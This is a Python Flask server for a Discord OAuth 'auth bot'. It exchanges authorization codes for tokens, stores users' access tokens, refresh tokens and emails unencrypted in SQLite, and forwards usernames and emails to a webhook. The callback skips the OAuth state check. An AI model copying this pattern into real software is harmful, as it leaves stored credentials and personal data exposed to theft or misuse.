from flask import Flask, request
import aiohttp
import asyncio
import os
import datetime
import sqlite3
from dotenv import load_dotenv

load_dotenv()

# SQLite database setup
DB_PATH = 'users.db'

def get_db_connection():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db_connection() as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id TEXT PRIMARY KEY,
                username TEXT,
                email TEXT,
                avatar TEXT,
                token TEXT,
                refresh_token TEXT,
                token_type TEXT,
                scope TEXT,
                guild_id TEXT,
                auth_date TEXT
            )
        ''')
        conn.commit()

init_db()

app = Flask(__name__)

async def send_to_webhook(user_data):
    webhook_url = os.getenv('WEBHOOK_URL')
    print(f"Sending webhook for user: {user_data.get('username')}")
    
    embed = {
        "title": "🔐 New Authorization",
        "color": 0x2b2d31,
        "fields": [
            {
                "name": "👤 User",
                "value": f"{user_data.get('username')} (`{user_data.get('id')}`)",
                "inline": True
            },
            {
                "name": "📧 Email",
                "value": user_data.get('email', 'Not provided'),
                "inline": True
            }
        ],
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "footer": {
            "text": "🎡 @2vsq for auth bots"
        }
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(webhook_url, json={"embeds": [embed]}) as response:
                if response.status == 204:
                    print("Webhook sent successfully")
                else:
                    print(f"Webhook failed with status: {response.status}")
    except Exception as e:
        print(f"Error sending webhook: {e}")

async def process_oauth(code):
    guild_id = request.args.get('guild_id', '')
    print(f"Processing OAuth for guild: {guild_id}")
    
    async with aiohttp.ClientSession() as session:
        token_url = "https://discord.com/api/oauth2/token"
        data = {
            "client_id": os.getenv('CLIENT_ID'),
            "client_secret": os.getenv('CLIENT_SECRET'),
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": os.getenv('REDIRECT_URI')
        }
        
        async with session.post(token_url, data=data) as response:
            token_data = await response.json()
            
            if 'access_token' in token_data:
                headers = {'Authorization': f"Bearer {token_data['access_token']}"}
                async with session.get('https://discord.com/api/v9/users/@me', headers=headers) as me_response:
                    user_data = await me_response.json()
                    print(f"Saving auth for: {user_data.get('username')}")
                    
                    # Enhanced user document with more token details
                    user_doc = {
                        'id': user_data.get('id'),
                        'username': user_data.get('username'),
                        'email': user_data.get('email'),
                        'avatar': user_data.get('avatar'),
                        'token': token_data.get('access_token'),
                        'refresh_token': token_data.get('refresh_token'),
                        'token_type': token_data.get('token_type'),
                        'scope': token_data.get('scope', ''),
                        'guild_id': guild_id,
                        'auth_date': datetime.datetime.utcnow().isoformat()
                    }
                    
                    try:
                        # Insert or update user in SQLite database
                        with get_db_connection() as conn:
                            conn.execute('''
                                INSERT OR REPLACE INTO users (
                                    id, username, email, avatar, token, 
                                    refresh_token, token_type, scope, 
                                    guild_id, auth_date
                                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                            ''', (
                                user_doc['id'], user_doc['username'], user_doc['email'], 
                                user_doc['avatar'], user_doc['token'], user_doc['refresh_token'], 
                                user_doc['token_type'], user_doc['scope'], user_doc['guild_id'], 
                                user_doc['auth_date']
                            ))
                            conn.commit()
                        print(f"Auth saved successfully for {user_data.get('username')}!")
                        
                        await send_to_webhook(user_data)
                        return True
                        
                    except Exception as e:
                        print(f"Database error: {e}")
                        return False
    return False

@app.route('/callback')
def callback():
    code = request.args.get('code')
    print(f"Received callback with code: {code}")
    
    if code:
        try:
            result = asyncio.run(process_oauth(code))
            print(f"OAuth process result: {result}")
            if result:
                return """
                    <html>
                    <head>
                        <style>
                            body {
                                background-color: #000000;
                                display: flex;
                                justify-content: center;
                                align-items: center;
                                height: 100vh;
                                margin: 0;
                                font-family: Arial, sans-serif;
                            }
                            .auth-box {
                                background: linear-gradient(45deg, #9b42f5, #7a19f3);
                                padding: 30px 50px;
                                border-radius: 15px;
                                box-shadow: 0 0 20px rgba(155, 66, 245, 0.5);
                                text-align: center;
                                color: white;
                                animation: glow 2s infinite alternate;
                            }
                            @keyframes glow {
                                from {
                                    box-shadow: 0 0 20px rgba(155, 66, 245, 0.5);
                                }
                                to {
                                    box-shadow: 0 0 30px rgba(155, 66, 245, 0.8);
                                }
                            }
                            .checkmark {
                                font-size: 24px;
                                margin-bottom: 10px;
                            }
                        </style>
                    </head>
                    <body>
                        <div class="auth-box">
                            <div class="checkmark">✨</div>
                            Authorization Successful!
                        </div>
                        <script>
                            setTimeout(() => window.close(), 3000);
                        </script>
                    </body>
                    </html>
                """
            return "❌ Authorization failed. Please try again."
        except Exception as e:
            print(f"Error during OAuth: {e}")
            return "Authorization processing..."
    return "Ready for authorization"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
